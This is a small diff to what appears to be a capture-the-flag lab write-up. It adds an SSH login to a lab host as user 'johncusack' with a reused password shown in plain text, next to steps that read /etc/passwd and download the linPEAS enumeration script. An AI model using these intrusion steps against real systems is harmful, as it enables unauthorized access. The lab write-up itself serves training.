@@ -74,6 +74,7 @@ cat /etc/passwd/
 Login as johncusack using reused password:
 ```bash
 # johncusack // BackDropJ2024DS2024
+ssh johncusack@10.10.11.58
 
 # Upload linPEAS for enumeration
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
